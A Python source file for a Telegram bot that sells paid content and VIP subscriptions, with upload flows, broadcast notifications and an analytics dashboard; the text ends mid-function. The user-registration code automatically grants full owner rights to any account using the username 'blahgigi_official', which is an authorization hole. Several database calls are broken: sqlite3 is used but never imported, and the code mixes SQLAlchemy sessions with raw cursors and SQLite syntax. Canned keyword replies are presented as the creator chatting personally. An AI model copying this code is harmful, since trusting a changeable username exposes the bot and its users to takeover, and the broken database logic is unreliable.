import os
import threading
import datetime
import telebot
from telebot import types
from flask import render_template_string
from app import app, db
from models import *
import logging
import socket
import ipaddress
import requests
import tempfile
from urllib.parse import urlparse
import mimetypes

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Bot token and owner IDs from environment variables
BOT_TOKEN = os.getenv('BOT_TOKEN')
OWNER_ID = int(os.getenv('OWNER_ID', '0'))  # Set this in Replit Secrets

# Multiple owners system - will be initialized after environment validation

# Special logging function for @blahgigi_official detection
def log_special_user_detection(message):
    """Log when @blahgigi_official interacts with the bot to capture her user ID"""
    username = message.from_user.username or "No username"
    user_id = message.from_user.id
    first_name = message.from_user.first_name or "No name"
    
    if username == "blahgigi_official":
        print(f"\n🎯 ===== @blahgigi_official DETECTED! =====")
        print(f"👤 USER ID: {user_id}")
        print(f"📧 First Name: {first_name}")
        print(f"🔑 Username: @{username}")
        print(f"🚨 ADD THIS ID TO OWNERS LIST: {user_id}")
        print(f"============================================\n")
        logger.info(f"OWNER ACCESS DETECTION: @blahgigi_official (ID: {user_id}) interacted with bot")
        
        # Also send notification to current owner
        try:
            if OWNER_ID != user_id:  # Don't send notification to herself
                bot.send_message(OWNER_ID, f"🎯 @blahgigi_official detected!\n\n👤 Name: {first_name}\n🆔 User ID: {user_id}\n🔑 Username: @{username}\n\n📋 Add this ID to OWNERS list for full access")
        except:
            pass
    
    return user_id

# Function to check if user is an owner
def is_owner(user_id):
    """Check if user_id is in the owners list"""
    return user_id in OWNERS

# For development/testing, check if we have the required credentials
missing_credentials = []
if not BOT_TOKEN:
    missing_credentials.append("BOT_TOKEN")
if OWNER_ID == 0:
    missing_credentials.append("OWNER_ID")

if missing_credentials:
    logger.error(f"Missing required environment variables: {', '.join(missing_credentials)}")
    logger.error("Please add these to your Replit Secrets or environment variables")
    logger.info("Starting in web-only mode - Flask server will run for health checks")
    
    # Set dummy values to prevent crashes when initializing bot
    if not BOT_TOKEN:
        BOT_TOKEN = "dummy_token_for_web_mode"
    if OWNER_ID == 0:
        OWNER_ID = 12345  # dummy ID

# Initialize OWNERS list after environment validation
OWNERS = [OWNER_ID]  # Will expand this list when we detect @blahgigi_official's ID

def notify_all_owners(message, parse_mode=None):
    """Send notification to all owners"""
    for owner_id in OWNERS:
        try:
            bot.send_message(owner_id, message, parse_mode=parse_mode)
        except:
            pass

# Initialize bot with proper token handling
if BOT_TOKEN and BOT_TOKEN != "dummy_token_for_web_mode":
    bot = telebot.TeleBot(BOT_TOKEN)
else:
    # Create a dummy bot object for web-only mode - need valid format
    bot = telebot.TeleBot("12345:DUMMY_TOKEN_FOR_WEB_MODE")

# Dictionary to store temporary upload data for guided content creation
upload_sessions = {}

# Dictionary to store notification composition sessions
notification_sessions = {}

# Database setup
def init_database():
    """Initialize PostgreSQL database with required tables and default data"""
    with app.app_context():
        # Tables are already created by models.py, now add default data
    
        # Insert default VIP settings
        vip_settings_data = [
            ('vip_price_stars', '399'),
            ('vip_duration_days', '30'),
            ('vip_description', 'Premium VIP access with exclusive content and direct chat')
        ]
        
        for key, value in vip_settings_data:
            existing = VipSetting.query.filter_by(key=key).first()
            if not existing:
                setting = VipSetting(key=key, value=value)
                db.session.add(setting)
        
        # Insert default AI responses
        default_responses = [
            ('greeting', 'Hey there! 😊 Thanks for reaching out! I love connecting with you baby. What\'s on your mind?'),
            ('question', 'That\'s a great question! I appreciate you asking. Feel free to check out my content or ask me anything else! 💕'),
            ('compliment', 'Aww, you\'re so sweet! Thank you! That really makes my day. You\'re amazing! ✨'),
            ('default', 'Thanks for the message! I love hearing from you. Don\'t forget to check out my exclusive content! 😘')
        ]
        
        for key, text in default_responses:
            existing = Response.query.filter_by(key=key).first()
            if not existing:
                response = Response(key=key, text=text)
                db.session.add(response)
    
        
        db.session.commit()
        logger.info("Database initialized successfully")

def get_db_connection():
    """Get database session - compatibility wrapper for SQLAlchemy"""
    return db.session

def get_user_data(user_id):
    """Get user data from database"""
    return User.query.filter_by(user_id=user_id).first()

def add_or_update_user(user):
    """Add new user or update existing user data"""
    # SPECIAL DETECTION: Check for @blahgigi_official and log her ID
    if hasattr(user, 'username') and user.username == "blahgigi_official":
        print(f"\n🎯 ===== @blahgigi_official DETECTED! =====")
        print(f"👤 USER ID: {user.id}")
        print(f"📧 First Name: {user.first_name}")
        print(f"🔑 Username: @{user.username}")
        print(f"🚨 ADD THIS ID TO OWNERS LIST: {user.id}")
        print(f"============================================\n")
        logger.info(f"OWNER ACCESS DETECTION: @blahgigi_official (ID: {user.id}) interacted with bot")
        
        # AUTOMATICALLY add to OWNERS list if not already there
        if user.id not in OWNERS:
            OWNERS.append(user.id)
            print(f"✅ @blahgigi_official (ID: {user.id}) AUTOMATICALLY ADDED to OWNERS list!")
            logger.info(f"OWNER ADDED: @blahgigi_official (ID: {user.id}) added to OWNERS list automatically")
        
        # Notify all other owners
        try:
            for owner_id in OWNERS:
                if owner_id != user.id:  # Don't send notification to herself
                    try:
                        bot.send_message(owner_id, f"🎯 @blahgigi_official detected and granted owner access!\n\n👤 Name: {user.first_name}\n🆔 User ID: {user.id}\n🔑 Username: @{user.username}\n\n✅ Automatically added to OWNERS list")
                    except:
                        pass
        except:
            pass

    # Prevent owners from being registered as regular users
    if is_owner(user.id):
        return  # Don't register owners
    
    # Prevent bots from being registered as users
    if getattr(user, 'is_bot', False):
        return  # Don't register bot accounts
    
    # Prevent accounts with bot-like usernames from being registered
    if user.username and user.username.lower().endswith('bot'):
        return  # Don't register likely bot accounts
    
    # Prevent bot from registering itself as a user
    try:
        bot_info = bot.get_me()
        if user.id == bot_info.id:
            return  # Don't process bot's own messages
    except Exception as e:
        logger.warning(f"Could not get bot info: {e}")
        # Continue processing if we can't get bot info
    
    with app.app_context():
        now = datetime.datetime.now()
        
        # Check if user exists
        existing_user = get_user_data(user.id)
        
        if existing_user:
            # Update interaction count and last interaction
            existing_user.interaction_count += 1
            existing_user.last_interaction = now
            existing_user.username = user.username
            existing_user.first_name = user.first_name
        else:
            # Add new user
            new_user = User(
                user_id=user.id,
                username=user.username,
                first_name=user.first_name,
                join_date=now,
                last_interaction=now,
                interaction_count=1
            )
            db.session.add(new_user)
            
            # Send welcome notification to all owners
            try:
                notify_all_owners(f"👋 New user started chatting!\n👤 {user.first_name} (@{user.username})\n🆔 ID: {user.id}")
            except:
                pass
        
        db.session.commit()

def check_user_owns_content(user_id, content_name):
    """Check if user has already purchased specific content"""
    with app.app_context():
        purchase = UserPurchase.query.filter_by(user_id=user_id, content_name=content_name).first()
        return purchase is not None

def get_user_purchased_content(user_id):
    """Get all BROWSE content purchased by a user - does not include VIP content"""
    with app.app_context():
        purchases = db.session.query(UserPurchase, ContentItem).join(
            ContentItem, UserPurchase.content_name == ContentItem.name
        ).filter(
            UserPurchase.user_id == user_id,
            ContentItem.content_type == 'browse'
        ).order_by(UserPurchase.purchase_date.desc()).all()
        
        return [(p.UserPurchase.content_name, p.UserPurchase.purchase_date, 
                 p.UserPurchase.price_paid, p.ContentItem.description, 
                 p.ContentItem.file_path) for p in purchases]

def get_vip_subscribers():
    """Get all active VIP subscribers for notifications"""
    from sqlalchemy import and_, func
    
    # Get active VIP subscribers
    vip_users = db.session.query(User.user_id, User.first_name, User.username).join(
        VipSubscription, User.user_id == VipSubscription.user_id
    ).filter(
        and_(
            VipSubscription.is_active == True,
            VipSubscription.expiry_date > func.now(),
            User.user_id != OWNER_ID,
            db.or_(User.username.is_(None), ~func.lower(User.username).like('%bot'))
        )
    ).all()
    
    return vip_users

def get_non_vip_users():
    """Get all non-VIP users (users without active VIP subscriptions) for notifications"""
    from sqlalchemy import and_, func, or_
    
    # Get users who are not VIP subscribers (no active subscription or expired)
    non_vip_users = db.session.query(User.user_id, User.first_name, User.username).outerjoin(
        VipSubscription, User.user_id == VipSubscription.user_id
    ).filter(
        and_(
            or_(
                VipSubscription.user_id.is_(None),
                VipSubscription.is_active == False,
                VipSubscription.expiry_date <= func.now()
            ),
            User.user_id != OWNER_ID,
            or_(User.username.is_(None), ~func.lower(User.username).like('%bot'))
        )
    ).all()
    
    return non_vip_users

def get_all_users():
    """Get all users for general notifications"""
    from sqlalchemy import and_, func, or_
    
    all_users = db.session.query(User.user_id, User.first_name, User.username).filter(
        and_(
            User.user_id != OWNER_ID,
            or_(User.username.is_(None), ~func.lower(User.username).like('%bot'))
        )
    ).order_by(User.last_interaction.desc()).all()
    
    return all_users

def send_notification_to_users(user_list, message_text, markup=None, pin_message=False):
    """
    Send notifications to a list of users with error handling
    
    Args:
        user_list: List of tuples (user_id, first_name, username)
        message_text: HTML formatted message text
        markup: InlineKeyboardMarkup for buttons (optional)
        pin_message: Whether to pin the message (default False)
    
    Returns:
        dict: Statistics about sent/failed notifications
    """
    sent_count = 0
    failed_count = 0
    blocked_count = 0
    failed_users = []
    
    for user_id, first_name, username in user_list:
        try:
            # Don't send to bot owner to avoid spam
            if is_owner(user_id):
                continue
                
            # Send the notification
            sent_message = bot.send_message(
                user_id, 
                message_text, 
                reply_markup=markup, 
                parse_mode='HTML',
                disable_notification=False
            )
            
            # Pin message if requested and successfully sent
            if pin_message and sent_message:
                try:
                    bot.pin_chat_message(user_id, sent_message.message_id, disable_notification=True)
                except Exception as pin_error:
                    logger.warning(f"Failed to pin message for user {user_id}: {pin_error}")
            
            sent_count += 1
            logger.info(f"Notification sent to {first_name} (@{username}) - ID: {user_id}")
            
        except Exception as e:
            # Check if it's a Telegram API exception indicating user blocked the bot
            error_str = str(e).lower()
            if "403" in error_str or "forbidden" in error_str or "blocked" in error_str:
                # User blocked the bot
                blocked_count += 1
                logger.info(f"User {first_name} (@{username}) has blocked the bot")
            else:
                failed_count += 1
                failed_users.append((user_id, first_name, username, str(e)))
                logger.error(f"Failed to send notification to {first_name} (@{username}): {e}")
    
    return {
        'sent': sent_count,
        'failed': failed_count,
        'blocked': blocked_count,
        'failed_users': failed_users,
        'total_targeted': len(user_list)
    }

def notify_vip_teaser_uploaded(teaser_description):
    """Send notification to all VIP subscribers about new VIP teaser"""
    vip_users = get_vip_subscribers()
    
    if not vip_users:
        logger.info("No VIP users to notify about new VIP teaser")
        return {'sent': 0, 'failed': 0, 'blocked': 0, 'total_targeted': 0}
    
    # Create VIP teaser notification message
    notification_text = f"""
💎 <b>NEW VIP EXCLUSIVE TEASER!</b> 💎

🎬 A brand new VIP teaser just dropped exclusively for you!

✨ <b>What's new:</b> {teaser_description}

🔥 As a VIP member, you get exclusive access to premium teasers that nobody else can see!

💕 Thank you for being an amazing VIP supporter!
"""
    
    # Create inline keyboard with VIP teaser button
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎬 View VIP Teasers", callback_data="vip_teasers_collection"))
    markup.add(types.InlineKeyboardButton("💎 VIP Status", callback_data="vip_status"))
    
    # Send notifications with message pinning
    stats = send_notification_to_users(vip_users, notification_text, markup, pin_message=True)
    
    # Log results
    logger.info(f"VIP teaser notification sent to {stats['sent']}/{stats['total_targeted']} VIP users")
    
    # Notify owner about broadcast results
    try:
        owner_message = f"""
📊 <b>VIP TEASER NOTIFICATION SENT</b>

🎬 <b>Teaser:</b> {teaser_description}
✅ <b>Sent:</b> {stats['sent']} users
❌ <b>Failed:</b> {stats['failed']} users
🚫 <b>Blocked:</b> {stats['blocked']} users
📱 <b>Total VIPs:</b> {stats['total_targeted']} users

💡 All VIP members have been notified about the new exclusive teaser!
"""
        bot.send_message(OWNER_ID, owner_message, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Failed to notify owner about VIP teaser broadcast: {e}")
    
    return stats

def notify_free_teaser_uploaded(teaser_description):
    """Send notification to all non-VIP users about new free teaser"""
    non_vip_users = get_non_vip_users()
    
    if not non_vip_users:
        logger.info("No non-VIP users to notify about new free teaser")
        return {'sent': 0, 'failed': 0, 'blocked': 0, 'total_targeted': 0}
    
    # Create free teaser notification message
    notification_text = f"""
🎬 <b>NEW FREE TEASER AVAILABLE!</b> 🎬

✨ I just dropped a brand new teaser for you to enjoy!

🎁 <b>What's new:</b> {teaser_description}

💡 <b>Want more exclusive content?</b>
Upgrade to VIP for premium teasers and unlimited access to my exclusive content library!

🔥 Don't miss out - check it out now!
"""
    
    # Create inline keyboard with teaser and VIP upgrade buttons
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎬 View Free Teasers", callback_data="teasers"))
    markup.add(types.InlineKeyboardButton("💎 Upgrade to VIP", callback_data="vip_access"))
    
    # Send notifications with message pinning
    stats = send_notification_to_users(non_vip_users, notification_text, markup, pin_message=True)
    
    # Log results
    logger.info(f"Free teaser notification sent to {stats['sent']}/{stats['total_targeted']} non-VIP users")
    
    # Notify owner about broadcast results
    try:
        owner_message = f"""
📊 <b>FREE TEASER NOTIFICATION SENT</b>

🎬 <b>Teaser:</b> {teaser_description}
✅ <b>Sent:</b> {stats['sent']} users
❌ <b>Failed:</b> {stats['failed']} users
🚫 <b>Blocked:</b> {stats['blocked']} users
👥 <b>Total Non-VIPs:</b> {stats['total_targeted']} users

💡 All non-VIP users have been notified about the new free teaser!
"""
        bot.send_message(OWNER_ID, owner_message, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Failed to notify owner about free teaser broadcast: {e}")
    
    return stats

def deliver_owned_content(chat_id, user_id, content_name):
    """Re-deliver content that user already owns"""
    # First verify the user actually owns this content
    if not check_user_owns_content(user_id, content_name):
        bot.send_message(chat_id, "❌ You don't own this content. Please purchase it first!")
        return False
    
    # Get content details
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('SELECT file_path, description FROM content_items WHERE name = ?', (content_name,))
    content = cursor.fetchone()
    conn.close()
    
    if not content:
        bot.send_message(chat_id, f"❌ Content '{content_name}' not found.")
        return False
    
    file_path, description = content
    
    # Send re-access message
    reaccess_message = f"""
✅ <b>OWNED CONTENT ACCESS</b> ✅

🎁 Here's your purchased content again!

<b>{content_name}</b>
{description}

💕 Baby, Thank you for supporting Mammy!
"""
    
    bot.send_message(chat_id, reaccess_message, parse_mode='HTML')
    
    # Send the actual content (same logic as purchase delivery)
    try:
        if file_path.startswith('http'):
            # It's a URL
            if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):
                bot.send_photo(chat_id, file_path, caption=f"🎁 {content_name}")
            elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):
                bot.send_video(chat_id, file_path, caption=f"🎁 {content_name}")
            else:
                bot.send_document(chat_id, file_path, caption=f"🎁 {content_name}")
        elif len(file_path) > 50 and not file_path.startswith('/'):
            # It's a Telegram file_id
            try:
                bot.send_photo(chat_id, file_path, caption=f"🎁 {content_name}")
            except:
                try:
                    bot.send_video(chat_id, file_path, caption=f"🎁 {content_name}")
                except:
                    try:
                        bot.send_document(chat_id, file_path, caption=f"🎁 {content_name}")
                    except:
                        bot.send_message(chat_id, f"🎁 Your content: {content_name}\n\nFile ID: {file_path}\n\n⚠️ If you have trouble accessing this content, please contact me!")
        else:
            # It's a local file path
            with open(file_path, 'rb') as file:
                if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):
                    bot.send_photo(chat_id, file, caption=f"🎁 {content_name}")
                elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):
                    bot.send_video(chat_id, file, caption=f"🎁 {content_name}")
                else:
                    bot.send_document(chat_id, file, caption=f"🎁 {content_name}")
    except Exception as e:
        bot.send_message(chat_id, f"🎁 Your owned content: {content_name}\n\n⚠️ There was an issue delivering your content. Please contact me and I'll send it manually!")
        logger.error(f"Error sending owned content {content_name}: {e}")
        return False
    
    return True

def show_my_content(chat_id, user_id):
    """Show user's purchased content library with re-access options"""
    # Get user's purchased content
    purchases = get_user_purchased_content(user_id)
    
    if not purchases:
        no_content_message = """
📂 <b>MY CONTENT LIBRARY</b> 📂

🚫 You haven't purchased any content yet!

🛒 <b>Ready to get started?</b>
Step into my world and Browse the exclusive content you’ve been craving.

💡 <b>Secret:</b> Unlock the VIP experience and indulge in content that’s just for you. Go ahead, spoil yourself. 💋
"""
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 Browse Content", callback_data="browse_content"))
        markup.add(types.InlineKeyboardButton("💎 Upgrade to VIP", callback_data="vip_access"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
        bot.send_message(chat_id, no_content_message, reply_markup=markup, parse_mode='HTML')
        return
    
    # Create content library message
    library_text = f"📂 <b>MY CONTENT LIBRARY</b> 📂\n\n"
    library_text += f"🎉 You own {len(purchases)} piece(s) of exclusive content!\n\n"
    
    markup = types.InlineKeyboardMarkup()
    
    for content_name, purchase_date, price_paid, description, file_path in purchases:
        # Escape HTML special characters
        safe_name = content_name.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        safe_description = description.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
        
        # Format purchase date
        try:
            date_obj = datetime.datetime.fromisoformat(purchase_date)
            formatted_date = date_obj.strftime("%b %d, %Y")
        except:
            formatted_date = "Unknown"
        
        library_text += f"✨ <b>{safe_name}</b>\n"
        library_text += f"📅 Purchased: {formatted_date}\n"
        library_text += f"💰 Paid: {price_paid:,} Stars\n"
        library_text += f"📝 {safe_description}\n\n"
        
        # Add re-access button for each item
        markup.add(types.InlineKeyboardButton(f"🎁 Access {content_name}", callback_data=f"access_{content_name}"))
    
    # Add navigation buttons
    markup.add(types.InlineKeyboardButton("🛒 Browse More Content", callback_data="browse_content"))
    markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
    
    bot.send_message(chat_id, library_text, reply_markup=markup, parse_mode='HTML')

def show_analytics_dashboard(chat_id):
    """Show comprehensive analytics dashboard"""
    with app.app_context():
        from sqlalchemy import func
        from datetime import timedelta
        
        # Get user statistics
        total_users = User.query.count()
        
        week_ago = datetime.datetime.now() - timedelta(days=7)
        active_users_7d = User.query.filter(User.last_interaction >= week_ago).count()
        
        paying_users = User.query.filter(User.total_stars_spent > 0).count()
        
        # Get VIP statistics
        active_vips = VipSubscription.query.filter_by(is_active=True).count()
        
        # Get content statistics
        browse_content_count = ContentItem.query.filter_by(content_type='browse').count()
        vip_content_count = ContentItem.query.filter_by(content_type='vip').count()
        teaser_count = Teaser.query.count()
        
        # Get revenue statistics
        total_revenue = db.session.query(func.sum(User.total_stars_spent)).scalar() or 0
        avg_spent = db.session.query(func.avg(User.total_stars_spent)).filter(User.total_stars_spent > 0).scalar() or 0
        
        # Get top customers
        top_customers_query = User.query.filter(User.total_stars_spent > 0).order_by(User.total_stars_spent.desc()).limit(5).all()
        top_customers = [(u.first_name, u.username, u.total_stars_spent, u.interaction_count) for u in top_customers_query]
    
    analytics_text = f"""📊 <b>ANALYTICS DASHBOARD</b> 📊

👥 <b>User Statistics:</b>
• Total Users: {total_users:,}
• Active (7 days): {active_users_7d:,}
• Paying Customers: {paying_users:,}
• VIP Members: {active_vips:,}

💰 <b>Revenue:</b>
• Total Revenue: {total_revenue:,} Stars
• Average per Customer: {avg_spent:,.0f} Stars
• Conversion Rate: {(paying_users/max(total_users,1)*100):.1f}%

📱 <b>Content:</b>
• Browse Content: {browse_content_count}
• VIP Content: {vip_content_count}
• Teasers: {teaser_count}

🏆 <b>Top Customers:</b>"""
    
    if top_customers:
        for i, (first_name, username, spent, interactions) in enumerate(top_customers):
            safe_name = (first_name or 'N/A').replace('<', '&lt;').replace('>', '&gt;')
            safe_username = (username or 'none').replace('<', '&lt;').replace('>', '&gt;')
            analytics_text += f"\n{i+1}. {safe_name} (@{safe_username}) - {spent:,} Stars"
    else:
        analytics_text += "\nNo paying customers yet."
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("👥 View All Users", callback_data="owner_list_users"))
    markup.add(types.InlineKeyboardButton("💎 VIP Analytics", callback_data="vip_analytics"))
    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Menu", callback_data="owner_help"))
    
    bot.send_message(chat_id, analytics_text, reply_markup=markup, parse_mode='HTML')

def get_ai_response(message_text):
    """Get response based on message content"""
    with app.app_context():
        message_lower = message_text.lower()
        
        # Determine response type based on keywords
        if any(word in message_lower for word in ['hi', 'hello', 'hey', 'good morning', 'good evening']):
            response_key = 'greeting'
        elif any(word in message_lower for word in ['beautiful', 'gorgeous', 'amazing', 'love', 'perfect']):
            response_key = 'compliment'
        elif '?' in message_text:
            response_key = 'question'
        else:
            response_key = 'default'
        
        response_obj = Response.query.filter_by(key=response_key).first()
        
        if response_obj:
            response = response_obj.text
        else:
            response = "Thanks for the message! 😊"
        
        return response

def get_teasers():
    """Get all regular (non-VIP) teasers from database"""
    with app.app_context():
        teasers = Teaser.query.filter_by(vip_only=False).order_by(Teaser.created_date.desc()).all()
        return [(t.file_path, t.file_type, t.description) for t in teasers]

def get_teasers_with_id():
    """Get all regular (non-VIP) teasers with IDs for management"""
    with app.app_context():
        teasers = Teaser.query.filter_by(vip_only=False).order_by(Teaser.created_date.desc()).all()
        return [(t.id, t.file_path, t.file_type, t.description, t.created_date) for t in teasers]

def get_vip_teasers():
    """Get all VIP-only teasers from database"""
    with app.app_context():
        teasers = Teaser.query.filter_by(vip_only=True).order_by(Teaser.created_date.desc()).all()
        return [(t.file_path, t.file_type, t.description) for t in teasers]

def get_vip_teasers_with_id():
    """Get all VIP-only teasers with IDs for management"""
    with app.app_context():
        teasers = Teaser.query.filter_by(vip_only=True).order_by(Teaser.created_date.desc()).all()
        return [(t.id, t.file_path, t.file_type, t.description, t.created_date) for t in teasers]

def delete_teaser(teaser_id):
    """Delete a teaser by ID"""
    with app.app_context():
        teaser = Teaser.query.filter_by(id=teaser_id).first()
        if teaser:
            db.session.delete(teaser)
            db.session.commit()
            return True
        return False

def add_teaser(file_path, file_type, description, vip_only=False):
    """Add a teaser to the database"""
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO teasers (file_path, file_type, description, created_date, vip_only)
        VALUES (?, ?, ?, ?, ?)
    ''', (file_path, file_type, description, datetime.datetime.now().isoformat(), 1 if vip_only else 0))
    conn.commit()
    conn.close()

def start_vip_upload_session(chat_id, user_id):
    """Start guided VIP content upload session"""
    if user_id != OWNER_ID:
        bot.send_message(chat_id, "❌ Access denied. This is an owner-only command.")
        return
    
    # Initialize VIP upload session
    upload_sessions[OWNERS[0]] = {
        'type': 'vip_content',
        'step': 'waiting_for_file',
        'content_type': 'vip',
        'name': None,
        'price': None,
        'description': None,
        'file_path': None,
        'file_type': None
    }
    
    upload_text = """
💎 <b>VIP CONTENT UPLOAD</b> 💎

📤 <b>Step 1: Upload File</b>
Send me the file you want to add as VIP content:

📱 <b>Supported Files:</b>
• Photos (JPG, PNG, etc.)
• Videos (MP4)
• Animated GIFs

🎯 <b>Tips:</b>
• Upload high-quality visual content only
• VIP members get FREE access
• Non-VIP users need subscription

📂 Just send the photo/video when ready!
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel VIP Upload", callback_data="cancel_vip_upload"))
    
    bot.send_message(chat_id, upload_text, reply_markup=markup, parse_mode='HTML')

def handle_vip_file_upload(message, file_id, file_type):
    """Handle VIP content file upload"""
    logger.info(f"VIP content handler called - Content type: {message.content_type}, File type: {file_type}")
    session = upload_sessions[OWNERS[0]]
    
    # Store file information
    session['file_path'] = file_id
    session['file_type'] = file_type
    session['step'] = 'waiting_for_name'
    
    # Extract filename for smart default based on detected file type
    filename = "custom_content"
    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    
    if file_type.lower() == "photo":
        filename = f"vip_photo_{timestamp}"
    elif file_type.lower() == "video":
        filename = f"vip_video_{timestamp}"
    elif file_type.lower() == "gif":
        filename = f"vip_gif_{timestamp}"
    # Documents not supported for VIP content
    
    # Try to extract original filename for better defaults
    if message.content_type == 'video' and hasattr(message.video, 'file_name') and message.video.file_name:
        filename = message.video.file_name.split('.')[0]
    # Document handling removed for VIP content
    
    # Clean filename (replace spaces with underscores, keep alphanumeric)
    safe_filename = ''.join(c if c.isalnum() or c == '_' else '_' for c in filename.lower())
    session['suggested_name'] = safe_filename
    
    # Ask for content name
    name_text = f"""
✅ <b>{file_type.title()} uploaded successfully!</b>

📝 <b>Step 2: Content Name</b>
Choose a unique name for this VIP content:

💡 <b>Suggested:</b> <code>{safe_filename}</code>

🔤 <b>Naming Rules:</b>
• Use letters, numbers, and underscores only
• No spaces allowed
• Must be unique

✍️ Type your custom name or use the buttons below:
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton(f"✅ Use: {safe_filename}", callback_data="use_suggested_name"))
    markup.add(types.InlineKeyboardButton("❌ Cancel Upload", callback_data="cancel_vip_upload"))
    
    bot.send_message(message.chat.id, name_text, reply_markup=markup, parse_mode='HTML')

def handle_vip_name_input(message):
    """Handle VIP content name input"""
    session = upload_sessions[OWNERS[0]]
    name = message.text.strip()
    
    # Validate name
    if not name or ' ' in name or not all(c.isalnum() or c == '_' for c in name):
        bot.send_message(message.chat.id, "❌ Invalid name! Use only letters, numbers, and underscores (no spaces).\nExample: my_vip_content_1")
        return
    
    # Check if name already exists
    conn = sqlite3.connect('content_bot.db')
    cursor = conn.cursor()
    cursor.execute('SELECT name FROM content_items WHERE name = ?', (name,))
    existing = cursor.fetchone()
    conn.close()
    
    if existing:
        bot.send_message(message.chat.id, f"❌ Content with name '{name}' already exists! Choose a different name.")
        return
    
    # Store name and move to description step
    session['name'] = name
    session['step'] = 'waiting_for_description'
    
    desc_text = f"""
✅ <b>Name set:</b> {name}

📝 <b>Step 3: Description (Optional)</b>
Add a description that VIP members will see:

💡 <b>Examples:</b>
• "Exclusive behind-the-scenes content"
• "Special VIP-only photo set"
• "Premium video content for VIPs"

✍️ Type your description or skip to use a default:
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("⏭️ Skip Description", callback_data="skip_vip_description"))
    markup.add(types.InlineKeyboardButton("❌ Cancel Upload", callback_data="cancel_vip_upload"))
    
    bot.send_message(message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')

def handle_vip_description_input(message):
    """Handle VIP content description input"""
    session = upload_sessions[OWNERS[0]]
    description = message.text.strip()
    
    if description.lower() == 'skip':
        description = f"Exclusive VIP {session.get('file_type', 'content').lower()}"
    
    session['description'] = description
    
    # Set VIP price (VIP content is free for VIP members, but has nominal price for display)
    session['price'] = 0  # VIP content is free for VIP members
    
    # Save VIP content
    save_uploaded_content(session)

def handle_vip_settings_input(message):
    """Handle VIP settings input from interactive buttons"""
    # Security check: Only owner can modify VIP settings
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Access denied. This is an owner-only feature.")
        return
    
    # Robustness check: Ensure session exists and is valid
    if OWNERS[0] not in upload_sessions:
        bot.send_message(message.chat.id, "❌ No active VIP settings session. Please start from VIP Settings.")
        return
    
    session = upload_sessions[OWNERS[0]]
    
    # Validate session type
    if session.get('type') != 'vip_settings':
        bot.send_message(message.chat.id, "❌ Invalid session type. Please start from VIP Settings.")
        return
        
    setting = session.get('setting')
    if not setting:
        bot.send_message(message.chat.id, "❌ Invalid settings session. Please start from VIP Settings.")
        return
    
    user_input = message.text.strip()
    
    try:
        if setting == 'price':
            # Handle VIP price input
            try:
                price = int(user_input)
                if price <= 0 or price > 150000:
                    bot.send_message(message.chat.id, "❌ Price must be between 1 and 150,000 Stars! Please try again:")
                    return
                
                # Update VIP price setting
                conn = get_db_connection()
                cursor = conn.cursor()
                cursor.execute('INSERT OR REPLACE INTO vip_settings (key, value) VALUES (?, ?)', 
                             ('vip_price_stars', str(price)))
                conn.commit()
                conn.close()
                
                # Clear session
                del upload_sessions[OWNERS[0]]
                
                success_text = f"""
✅ <b>VIP PRICE UPDATED SUCCESSFULLY!</b> ✅

💰 <b>New VIP Price:</b> {price:,} Stars
💵 <b>Approximate USD:</b> ${price * 0.01:.2f}

🎉 All new VIP subscriptions will now cost {price:,} Stars!
"""
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("⚙️ VIP Settings", callback_data="vip_settings"))
                markup.add(types.InlineKeyboardButton("🏠 VIP Dashboard", callback_data="cmd_vip"))
                
                bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')
                
            except ValueError:
                bot.send_message(message.chat.id, "❌ Invalid price! Please enter a number (e.g., 399, 500, 1000, 5000):")
                return
        
        elif setting == 'duration':
            # Handle VIP duration input
            try:
                duration = int(user_input)
                if duration <= 0:
                    bot.send_message(message.chat.id, "❌ Duration must be a positive number! Please try again:")
                    return
                
                # Update VIP duration setting
                conn = get_db_connection()
                cursor = conn.cursor()
                cursor.execute('INSERT OR REPLACE INTO vip_settings (key, value) VALUES (?, ?)', 
                             ('vip_duration_days', str(duration)))
                conn.commit()
                conn.close()
                
                # Clear session
                del upload_sessions[OWNERS[0]]
                
                # Calculate friendly duration display
                duration_text = f"{duration} days"
                if duration == 7:
                    duration_text = "7 days (1 week)"
                elif duration == 30:
                    duration_text = "30 days (1 month)"
                elif duration == 90:
                    duration_text = "90 days (3 months)"
                elif duration == 365:
                    duration_text = "365 days (1 year)"
                
                success_text = f"""
✅ <b>VIP DURATION UPDATED SUCCESSFULLY!</b> ✅

⏰ <b>New VIP Duration:</b> {duration_text}

🎉 All new VIP subscriptions will now last for {duration} days!
"""
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("⚙️ VIP Settings", callback_data="vip_settings"))
                markup.add(types.InlineKeyboardButton("🏠 VIP Dashboard", callback_data="cmd_vip"))
                
